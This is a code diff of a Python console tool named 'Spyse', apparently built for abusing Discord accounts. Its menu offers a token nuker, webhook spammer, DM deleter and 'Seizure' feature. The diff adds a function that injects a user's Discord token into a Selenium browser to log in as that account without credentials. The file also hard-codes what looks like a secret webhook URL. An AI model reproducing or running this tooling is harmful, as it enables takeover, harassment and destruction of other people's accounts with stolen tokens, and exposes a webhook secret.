@@ -9,9 +9,12 @@ import rich
 from rich import * 
 import os 
 from os import system
+from selenium import webdriver
+
+
 console = get_console()
 
-maj = 'V4.3.2'
+maj = 'V3.5.1'
 webhook = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
 #please don't spam or nuke this one it's really important for the tool
 
@@ -117,6 +120,7 @@ def setting():
         console.print("[green]Discord : [/green][purple]BKS#1958[/purple]")
         console.print("[green]shop : [/green][purple]https://discord.gg/Dvu6s4TBFP[/purple]")
         console.print('[green]github = [/green][purple]https://github.com/heygdrg[/purple]')
+        console.print('[green]github = [/green][purple]https://github.com/CSM-BlueRed[/purple]')
         print()
         console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
         
@@ -274,10 +278,28 @@ def DmDeleter():
     console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
     main()
 
+def Token_login():
+    token = console.input("[green][[/green][purple]?[/purple][green]]Enter [purple]token[/purple] : ")
+    validateToken(token)
+    driver = webdriver.Chrome('chromedriver.exe')
+    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
+    user = j["username"] + "#" + str(j["discriminator"])
+    script = """
+            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
+            location.reload();
+            """ % (token)
+    console.print(f"[green][[/green][purple]![/purple][green]][/green] Connecting to {user}")
+    driver.get("https://discordapp.com/login")
+    driver.execute_script(script)
+    main()
+    while True: 
+        pass
+        
+
 def main():
     version()
-    login = os.getlogin()
-    os.system(f'Title - Spyse - {maj} - connected as : {login}')
+    sether = os.getlogin()
+    os.system(f'Title - Spyse - {maj} - connected as : {sether}')
     os.system('cls||clear')
 
     banner = """
@@ -289,11 +311,12 @@ def main():
                                     [green]███████[/green]║[green]██[/green]║        [green]██[/green]║   [green]███████[/green]║[green]███████[/green]╗    
                                     ╚══════╝╚═╝        ╚═╝   ╚══════╝╚══════╝    
                             ╔═══════════════════════════════════════════════════╗                                             
-                            ║  [green]{[/green][purple]1[/purple][green]}[/green] Dm deleter              [green]{[/green][purple]6[/purple][green]}[/green] Server leaver    ║
-                            ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]7[/purple][green]}[/green] Seizure          ║
-                            ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]8[/purple][green]}[/green] Token info       ║
-                            ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]9[/purple][green]}[/green] Setting          ║
-                            ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]10[/purple][green]}[/green] Make a report   ║                                                                                                                                                 
+                            ║  [green]{[/green][purple]1[/purple][green]}[/green] Dm deleter              [green]{[/green][purple]7[/purple][green]}[/green] Server leaver    ║
+                            ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]8[/purple][green]}[/green] Seizure          ║
+                            ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]9[/purple][green]}[/green] Token info       ║
+                            ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]10[/purple][green]}[/green] Setting         ║
+                            ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]11[/purple][green]}[/green] Make a report   ║                                                                                                                                                 
+                            ║  [green]{[/green][purple]6[/purple][green]}[/green] Login token             [green]{[/green][purple]12[/purple][green]}[/green] Exit            ║
                             ╚═══════════════════════════════════════════════════╝
                  
     """
@@ -312,15 +335,19 @@ def main():
     if choice == "5":
         tokendisable()
     if choice == "6":
-        Leaver()
+        Token_login()
     if choice == "7":
-        StartSeizure()
+        Leaver()
     if choice == "8":
-        token_info()
+        StartSeizure()
     if choice == "9":
-        setting()
+        token_info()
     if choice == "10":
+        setting()
+    if choice == "11":
         report()
+    if choice == "12":
+        raise SystemExit
     else:
         os.system('cls||clear')
         main()
